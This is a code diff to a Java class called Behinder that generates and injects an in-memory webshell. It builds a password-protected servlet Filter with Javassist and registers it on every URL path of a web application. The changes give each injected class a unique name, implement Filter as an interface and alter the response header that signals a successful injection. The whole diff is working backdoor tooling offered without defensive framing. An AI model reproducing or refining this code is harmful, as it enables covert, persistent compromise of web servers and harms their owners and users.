@@ -26,12 +26,13 @@ public class Behinder {
         classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
         classPool.insertClassPath(new ClassClassPath(Behinder.class));
 
-
-        CtClass ctClass = classPool.makeClass("MemBehinder3");
+        String cname = "MemBehinder3"+ System.nanoTime();
+        CtClass ctClass = classPool.makeClass(cname);
         if (ctClass.getDeclaredConstructors().length != 0) {
             ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
         }
-        ctClass.setSuperclass(classPool.getCtClass(Filter.class.getName()));
+        //ctClass.setSuperclass(classPool.getCtClass(Filter.class.getName()));
+        ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
         ctClass.addField(CtField.make("public javax.servlet.jsp.PageContext pageContext;",ctClass));
         ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
 
@@ -60,10 +61,9 @@ public class Behinder {
                 "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                 "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                 "\n" +
-                "            response.setHeader(\"inject\", \"ok\");\n" +
+                "            response.setHeader(\"inject\", \"success\");\n" +
                 "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
                 "            String k = md5(passwd);\n" +
-                "System.out.println(\"收到----\");"+
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
                 "            try{\n" +
@@ -127,7 +127,7 @@ public class Behinder {
                 "        javax.servlet.http.HttpSession session = (javax.servlet.http.HttpSession) context[2];\n" +
                 "        javax.servlet.jsp.PageContext page = (javax.servlet.jsp.PageContext) context[3];\n" +
                 "        try {\n" +
-                "            dynamicAddFilter(new MemBehinder3(page), \"Behinder\", \"/*\", request);\n" +
+                "            dynamicAddFilter(new "+cname+"(page), \"Behinder\", \"/*\", request);\n" +
                 "        } catch (IllegalAccessException e) {\n" +
                 "            e.printStackTrace();\n" +
                 "        }\n" +
